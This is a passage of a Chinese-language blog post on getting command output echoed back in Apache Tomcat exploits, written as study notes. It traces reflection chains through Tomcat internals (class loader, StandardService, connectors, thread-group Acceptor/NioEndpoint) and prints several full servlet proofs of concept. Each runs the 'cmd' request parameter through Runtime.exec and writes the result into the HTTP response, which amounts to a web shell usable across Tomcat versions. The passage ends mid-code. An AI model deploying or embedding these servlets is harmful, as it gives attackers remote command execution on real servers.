<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744091212387-4ec21e8c-6c54-42fb-954b-dbc76d53111c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744091212387-4ec21e8c-6c54-42fb-954b-dbc76d53111c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>现在获取链就变成了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StandardService --&gt; connectors --&gt; connector --&gt; protocolHandler --&gt; handler --&gt; AbstractProtocol$ConnectoinHandler --&gt; global --&gt; RequestInfo --&gt; req --&gt; response</span><br></pre></td></tr></table></figure>

<p>connectors同样为非静态属性，那么我们就需要获取在Tomcat中已经存在的StandardService对象。</p>
<h4 id="UbuaO">关键</h4>

<p>接下来的关键就在于，我们该如何获取<code>StandardService</code>的对象</p>
<p>我们回顾一下tomcat的架构</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744091535796-e7d6f017-e184-4235-8713-739cdc488780.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744091535796-e7d6f017-e184-4235-8713-739cdc488780.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>Service是Tomcat的最外层对象了，如果再往外就会涉及到Tomcat的类加载机制。Tomcat的类加载机制并不是传统双亲委派机制，因为双亲委派机制不适用于存在多个WebAPP的情况</p>
<blockquote>
<p>假设WebApp A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2 这样在加载的时候由于全限定名相同，不能同时加载，所以必须对各个webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离，tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是WebappClassLoader。</p>
</blockquote>
<p>与双亲委派机制相反，Tomcat加载机制为：WebAppClassLoader负责加载本身的目录下的class文件，加载不到时，才会交给CommonClassLoader加载</p>
<p>在SpringBoot项目中，alt+f8 计算看下<code>Thread.currentThread().getContextClassLoader() </code>中的内容，可以看到再类加载器中，就包含了我们的<code>StandardService</code>对象。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744092492786-c9082e5c-2d80-4e41-b345-839e13d8b3a2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744092492786-c9082e5c-2d80-4e41-b345-839e13d8b3a2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WebappClassLoader --&gt; resources --&gt; context --&gt; context --&gt; StandardService --&gt; connectors --&gt; connector --&gt; protocolHandler --&gt; handler --&gt; AbstractProtocol$ConnectoinHandler --&gt; global --&gt; RequestInfo --&gt; req --&gt; response</span><br></pre></td></tr></table></figure>

<p>在整个调用链中，有些变量可以<code>get</code>方法获取，对于私有和保护属性的变量我们只能通过反射来获取了</p>
<h3 id="fDOJU">实现</h3>

<p>对于不同版本的Tomcat获取方式不同，Tomcat8&#x2F;9或者更低的版本，可以直接从<code>webappClassLoaderBase.getResources().getContext()</code>中获取</p>
<p>其实就是response经过了层层的封装，我们需要一层一层的剥开他的心~，对于存在getter方法的使用getter即可，对于私有保护属性的，使用反射获取即可</p>
<h4 id="TmsBx">自写POC</h4>
POC如下（自己写的比较杂乱，算是让自己了解一遍流程吧）

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/index&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="type">Context</span> <span class="variable">standardContext1</span> <span class="operator">=</span> webappClassLoaderBase.getResources().getContext();</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) getField(standardContext1, <span class="string">&quot;context&quot;</span>);</span><br><span class="line">                <span class="type">Service</span> <span class="variable">service</span> <span class="operator">=</span> (Service) getField(applicationContext, <span class="string">&quot;service&quot;</span>);</span><br><span class="line">                Connector[] connectors = (Connector[]) getField(service, <span class="string">&quot;connectors&quot;</span>);</span><br><span class="line">                <span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connectors[<span class="number">0</span>].getProtocolHandler();</span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">handlerField</span> <span class="operator">=</span> AbstractProtocol.class.getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                handlerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                AbstractEndpoint.<span class="type">Handler</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractEndpoint.Handler) handlerField.get(protocolHandler);</span><br><span class="line"></span><br><span class="line">                <span class="type">RequestGroupInfo</span> <span class="variable">global</span> <span class="operator">=</span> (RequestGroupInfo) handler.getGlobal();</span><br><span class="line">                ArrayList&lt;RequestInfo&gt; processors = (ArrayList&lt;RequestInfo&gt;) getField(global, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">reqField</span> <span class="operator">=</span> RequestInfo.class.getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                reqField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (RequestInfo processor : processors) &#123;</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">requestA</span> <span class="operator">=</span> (Request) reqField.get(processor);</span><br><span class="line">                    org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">connectorRequest</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) requestA.getNote(<span class="number">1</span>);<span class="comment">//获取catalina.connector.Request类型的Request</span></span><br><span class="line">                    org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">connectorResponse</span> <span class="operator">=</span> connectorRequest.getResponse();</span><br><span class="line">                    java.io.<span class="type">Writer</span> <span class="variable">w</span> <span class="operator">=</span> response.getWriter();<span class="comment">//获取Writer</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">usingWriter</span> <span class="operator">=</span> org.apache.catalina.connector.Response.class.getDeclaredField(<span class="string">&quot;usingWriter&quot;</span>);</span><br><span class="line">                    usingWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    usingWriter.set(connectorResponse, Boolean.FALSE);<span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">stream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(stream).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    w.write(s);</span><br><span class="line">                    w.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; Object <span class="title function_">getField</span><span class="params">(T obj , String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> declaredField.get(obj);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="uW2GG">拿来主义</h4>
相比于其他师傅写的，我的实在是太杂乱了，也可能是因为学的不精吧

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 适用于 Tomcat8，获取全局 response 进行攻击  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/servletAttack&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalContextAttack</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 获取Tomcat ClassLoader context  </span></span><br><span class="line">            org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 获取standardContext的context  </span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);<span class="comment">//将变量设置为可访问  </span></span><br><span class="line">            org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> (org.apache.catalina.core.ApplicationContext) context.get(standardContext);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 获取ApplicationContext的service  </span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">service</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);  </span><br><span class="line">            service.setAccessible(<span class="literal">true</span>);<span class="comment">//将变量设置为可访问  </span></span><br><span class="line">            <span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (StandardService) service.get(ApplicationContext);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 获取StandardService的connectors  </span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">connectorsField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="string">&quot;connectors&quot;</span>);  </span><br><span class="line">            connectorsField.setAccessible(<span class="literal">true</span>);<span class="comment">//将变量设置为可访问  </span></span><br><span class="line">            org.apache.catalina.connector.Connector[] connectors = (org.apache.catalina.connector.Connector[]) connectorsField.get(standardService);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 获取AbstractProtocol的handler  </span></span><br><span class="line">            org.apache.coyote.<span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connectors[<span class="number">0</span>].getProtocolHandler();  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">handlerField</span> <span class="operator">=</span> org.apache.coyote.AbstractProtocol.class.getDeclaredField(<span class="string">&quot;handler&quot;</span>);  </span><br><span class="line">            handlerField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            org.apache.tomcat.util.net.AbstractEndpoint.<span class="type">Handler</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractEndpoint.Handler) handlerField.get(protocolHandler);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 获取内部类ConnectionHandler的global  </span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);  </span><br><span class="line">            globalField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">RequestGroupInfo</span> <span class="variable">global</span> <span class="operator">=</span> (RequestGroupInfo) globalField.get(handler);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 获取RequestGroupInfo的processors  </span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">processors</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);  </span><br><span class="line">            processors.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            java.util.List&lt;RequestInfo&gt; RequestInfolist = (java.util.List&lt;RequestInfo&gt;) processors.get(global);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 获取Response，并做输出处理  </span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">reqField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);  </span><br><span class="line">            reqField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="keyword">for</span> (RequestInfo requestInfo : RequestInfolist) &#123;<span class="comment">//遍历  </span></span><br><span class="line">                org.apache.coyote.<span class="type">Request</span> <span class="variable">coyoteReq</span> <span class="operator">=</span> (org.apache.coyote.Request )reqField.get(requestInfo);<span class="comment">//获取request  </span></span><br><span class="line">                org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">connectorRequest</span> <span class="operator">=</span> ( org.apache.catalina.connector.Request)coyoteReq.getNote(<span class="number">1</span>);<span class="comment">//获取catalina.connector.Request类型的Request  </span></span><br><span class="line">                org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">connectorResponse</span> <span class="operator">=</span> connectorRequest.getResponse();  </span><br><span class="line">                java.io.<span class="type">Writer</span> <span class="variable">w</span> <span class="operator">=</span> response.getWriter();<span class="comment">//获取Writer  </span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">responseField</span> <span class="operator">=</span> ResponseFacade.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);  </span><br><span class="line">                responseField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">usingWriter</span> <span class="operator">=</span> Response.class.getDeclaredField(<span class="string">&quot;usingWriter&quot;</span>);  </span><br><span class="line">                usingWriter.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                usingWriter.set(connectorResponse, Boolean.FALSE);<span class="comment">//初始化  </span></span><br><span class="line">                w.write(<span class="string">&quot;1111&quot;</span>);  </span><br><span class="line">                w.flush();<span class="comment">//刷新  </span></span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="J6r0c">Tomcat版本问题</h3>
我们上述的回显方式只适用于Tomcat8/9当中，但是有没有一种方式能够通杀呢？

<p>回顾我们的获取链</p>
<p>我们前面做的一些操作，就是为了获取<code>AbstractProtocol$ConnectoinHandler</code>该类，接下来我们也可以去寻找其他地方，该地方也存储着<code>AbstractProtocol$ConnectoinHandler</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WebappClassLoader --&gt; resources --&gt; context --&gt; context --&gt; StandardService --&gt; connectors --&gt; connector --&gt; protocolHandler --&gt; handler --&gt; AbstractProtocol$ConnectoinHandler --&gt; global --&gt; RequestInfo --&gt; req --&gt; response</span><br></pre></td></tr></table></figure>

<h4 id="ekMKD">分析</h4>

<p>在<code>org.apache.tomcat.util.net.AbstractEndpoint</code>中的handler是<code>AbstractEndpointHandler</code>自定义的，同时Handler的实现类是<code>AbstractProtocol$ConnectoinHandler</code></p>
<p>因为 <code>AbstractEndpoint </code>是抽象类，抽象类不能被实例化，所以我们去寻找其对应的子类，只要获取到对应的子类后，我们就能获取 handler 中的 <code>AbstractProtocol$ConnectoinHandler</code> 从而进一步获取 request 了</p>
<p>这里我们看到他有四个子类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744105479071-f36f720b-fe50-4491-b1a5-41ab5e4d0848.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744105479071-f36f720b-fe50-4491-b1a5-41ab5e4d0848.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里我们来看到 <code>NioEndpoint</code> 类。<code>NioEndpoint</code> 是主要负责接受和处理 socket 的且其中实现了socket请求监听线程Acceptor、socket NIO poller线程、以及请求处理线程池</p>
<p>此时有一下两种方法从<code>Thread.currentThread().getThreadGroup() </code>获取的线程中遍历找出我们需要的NioEndpoint 对象。</p>
<h5 id="s6hlG">通过Acceptor获取NioEndpoint</h5>

<p>遍历线程，获取线程中的target属性，如果该target是<code>Acceptor</code>类的话则其endpoint属性就是<code>NioEndpoint</code> 对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744106159847-d5e642ba-1818-4502-9cd9-108efa74f064.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744106159847-d5e642ba-1818-4502-9cd9-108efa74f064.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>利用链如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread.currentThread().getThreadGroup() --&gt; theads[] --&gt; thread --&gt; target --&gt; NioEndpoint$Poller --&gt; NioEndpoint --&gt; AbstractProtocol$ConnectoinHandler --&gt; global --&gt; RequestInfo --&gt; req --&gt; response</span><br></pre></td></tr></table></figure>

<h5 id="SRTAe">通过poller获取NioEndpoint</h5>

<p>遍历线程，获取线程中的target属性，如果target属性是 <code>NioEndpointPoller</code> 类的话，通过获取其父类 <code>NioEndpoint</code>，进而获取到 <code>AbstractProtocol$ConnectoinHandler</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744106058528-6fc2cbec-0611-41a6-bdb8-15708353212a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744106058528-6fc2cbec-0611-41a6-bdb8-15708353212a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>利用链如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread.currentThread().getThreadGroup() --&gt; theads[] --&gt; thread --&gt; target --&gt; NioEndpoint$Poller --&gt; NioEndpoint --&gt; AbstractProtocol$ConnectoinHandler --&gt; global --&gt; RequestInfo --&gt; req --&gt; response</span><br></pre></td></tr></table></figure>

<h4 id="zhLYB">实现</h4>
上面两种方式大同小异，我们使用第一种方法举例

<p>和我们低版本Tomcat的利用相类似，只是在获取<code>AbstractProtocol$ConnectoinHandler</code>的方式上有所不同</p>
<h5 id="H04fW">自写POC</h5>
自己写的方式还是太还，思路太不清晰了，还是别的师傅的清晰

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">ThreadGroup</span> <span class="variable">threadGroup</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">threadsField</span> <span class="operator">=</span>  ThreadGroup.class.getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">                threadsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                Thread[] threads = (Thread[])threadsField.get(threadGroup);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(Thread thread:threads) &#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">targetField</span> <span class="operator">=</span> Thread.class.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    targetField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">target</span>  <span class="operator">=</span> targetField.get(thread);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (target != <span class="literal">null</span> &amp;&amp; target.getClass() == org.apache.tomcat.util.net.Acceptor.class) &#123;</span><br><span class="line">                        <span class="type">Field</span> <span class="variable">endpointField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.tomcat.util.net.Acceptor&quot;</span>).getDeclaredField(<span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                        endpointField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">endpoint</span> <span class="operator">=</span> endpointField.get(target);</span><br><span class="line">                        <span class="type">Field</span> <span class="variable">handlerField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.tomcat.util.net.AbstractEndpoint&quot;</span>).getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                        handlerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        AbstractEndpoint.<span class="type">Handler</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractEndpoint.Handler) handlerField.get(endpoint);</span><br><span class="line"></span><br><span class="line">                        <span class="type">RequestGroupInfo</span> <span class="variable">global</span> <span class="operator">=</span> (RequestGroupInfo) handler.getGlobal();</span><br><span class="line">                        ArrayList&lt;RequestInfo&gt; processors = (ArrayList&lt;RequestInfo&gt;) getField(global, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="type">Field</span> <span class="variable">reqField</span> <span class="operator">=</span> RequestInfo.class.getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                        reqField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> (RequestInfo processor : processors) &#123;</span><br><span class="line">                            <span class="type">Request</span> <span class="variable">requestA</span> <span class="operator">=</span> (Request) reqField.get(processor);</span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">connectorRequest</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) requestA.getNote(<span class="number">1</span>);<span class="comment">//获取catalina.connector.Request类型的Request</span></span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">connectorResponse</span> <span class="operator">=</span> connectorRequest.getResponse();</span><br><span class="line">                            java.io.<span class="type">Writer</span> <span class="variable">w</span> <span class="operator">=</span> response.getWriter();<span class="comment">//获取Writer</span></span><br><span class="line">                            <span class="type">Field</span> <span class="variable">usingWriter</span> <span class="operator">=</span> org.apache.catalina.connector.Response.class.getDeclaredField(<span class="string">&quot;usingWriter&quot;</span>);</span><br><span class="line">                            usingWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            usingWriter.set(connectorResponse, Boolean.FALSE);<span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line">                            <span class="type">InputStream</span> <span class="variable">stream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                            <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(stream).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            w.write(s);</span><br><span class="line">                            w.flush();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; Object <span class="title function_">getField</span><span class="params">(T obj , String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> declaredField.get(obj);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="t14G7">拿来主义</h5>
Drunkbaby还是太全能了呜呜呜，对于POC的编写我也得加油了

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/AllTomcat&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AllTomcatVersionAttack</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 获取thread数组  </span></span><br><span class="line">            <span class="type">ThreadGroup</span> <span class="variable">threadGroup</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">threadsField</span> <span class="operator">=</span>  ThreadGroup.class.getDeclaredField(<span class="string">&quot;threads&quot;</span>);  </span><br><span class="line">            threadsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            Thread[] threads = (Thread[])threadsField.get(threadGroup);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">for</span>(Thread thread:threads) &#123;  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">targetField</span> <span class="operator">=</span> Thread.class.getDeclaredField(<span class="string">&quot;target&quot;</span>);  </span><br><span class="line">                targetField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">target</span>  <span class="operator">=</span> targetField.get(thread);  </span><br><span class="line">                <span class="keyword">if</span>( target != <span class="literal">null</span> &amp;&amp; target.getClass() == org.apache.tomcat.util.net.Acceptor.class ) &#123;  </span><br><span class="line">                    <span class="type">Field</span> <span class="variable">endpointField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.tomcat.util.net.Acceptor&quot;</span>).getDeclaredField(<span class="string">&quot;endpoint&quot;</span>);  </span><br><span class="line">                    endpointField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                    <span class="type">Object</span> <span class="variable">endpoint</span> <span class="operator">=</span> endpointField.get(target);  </span><br><span class="line">                    <span class="type">Field</span> <span class="variable">handlerField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.tomcat.util.net.AbstractEndpoint&quot;</span>).getDeclaredField(<span class="string">&quot;handler&quot;</span>);  </span><br><span class="line">                    handlerField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                    <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> handlerField.get(endpoint);  </span><br><span class="line">  </span><br><span class="line">                    <span class="comment">// 获取内部类ConnectionHandler的global  </span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);  </span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);  